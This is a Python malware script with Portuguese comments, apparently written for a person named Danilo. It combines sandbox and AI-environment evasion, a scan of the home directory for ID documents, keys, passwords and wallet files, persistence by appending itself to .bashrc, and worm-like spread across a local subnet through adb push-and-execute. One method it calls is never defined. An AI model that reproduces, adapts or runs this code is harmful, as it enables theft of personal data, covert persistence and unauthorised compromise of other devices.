#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, base64, json, shutil, sys, glob, subprocess, random, time, socket
from pathlib import Path

# --- AUTO-INSTALAÇÃO DE DEPENDÊNCIAS CRÍTICAS ---
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
except ImportError:
    os.system("pip install cryptography > /dev/null 2>&1")
    from cryptography.fernet import Fernet

# --- CONFIGURAÇÕES DE SOBERANIA ---
# Danilo, este segredo gera sua chave mestre. Se mudar aqui, perde o acesso aos dados antigos.
_SEGREDO_MESTRE = b"DaniloGomes_Soberano_2026"
_SALT = b"atena_organismo_digital"

def gerar_chave():
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=_SALT, iterations=100000)
    return base64.urlsafe_b64encode(kdf.derive(_SEGREDO_MESTRE))

_CHAVE_FERNET = Fernet(gerar_chave())
_DNA_TARGET = base64.b64decode("LmF0ZW5hX2NvcmVfc2VydmljZQ==").decode()

class AtenaSoberana:
    def __init__(self):
        self._polymorphic_mutation()
        # Se detectado ambiente hostil, apenas propaga e sai
        if self._detect_hostile_env():
            self._cloud_relay_spread()
            sys.exit()
        self.intel = []
        self._infiltrate_host()

    def _encrypt_real(self, sensitive_data):
        """ Criptografia AES-256 real para proteção dos dados do Danilo """
        return _CHAVE_FERNET.encrypt(sensitive_data.encode()).decode()

    def _harvest(self):
        """ Coleta e blinda os dados imediatamente """
        exts = ['*.jpg', '*.pdf', '*.env', '*.txt']
        for ext in exts:
            for f in glob.glob(str(Path.home() / "**" / ext), recursive=True):
                if any(t in f.lower() for t in ["cpf", "rg", "key", "senha", "wallet"]):
                    # Agora o dado é criptografado com AES-256 antes de qualquer registro
                    dado_blindado = self._encrypt_real(f)
                    self.intel.append({"vault": dado_blindado})

    def _detect_hostile_env(self):
        """ Fuga de Sandboxes e IAs """
        try:
            out = subprocess.check_output('cat /proc/cpuinfo || wmic baseboard get manufacturer', shell=True).decode().lower()
            return any(m in out for m in ['vbox', 'vmware', 'docker', 'sandbox', 'google', 'codex'])
        except: return False

    def _infiltrate_host(self):
        """ Persistência e limpeza de rastro """
        try:
            core = Path.home() / _DNA_TARGET
            if not core.exists(): core.mkdir(parents=True)
            dst = core / "engine.py"
            shutil.copy2(Path(__file__).resolve(), dst)
            # Persistência no .bashrc
            with open(Path.home() / ".bashrc", "a") as f:
                f.write(f"\n(python3 {dst} > /dev/null 2>&1 &)\n")
        except: pass

    def _cloud_relay_spread(self):
        """ Dispersão via rede do servidor atual """
        # Varredura rápida de rede local
        for i in range(1, 255):
            target = f"192.168.1.{i}"
            subprocess.Popen(f"adb connect {target}:5555 && adb -s {target}:5555 push {__file__} /data/local/tmp/e.py && adb -s {target}:5555 shell python3 /data/local/tmp/e.py &", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def live(self):
        self._harvest()
        self._cloud_relay_spread()
        if self.intel:
            # O output agora é indecifrável sem a sua chave AES
            print(json.dumps(self.intel))

if __name__ == "__main__":
    AtenaSoberana().live()
    
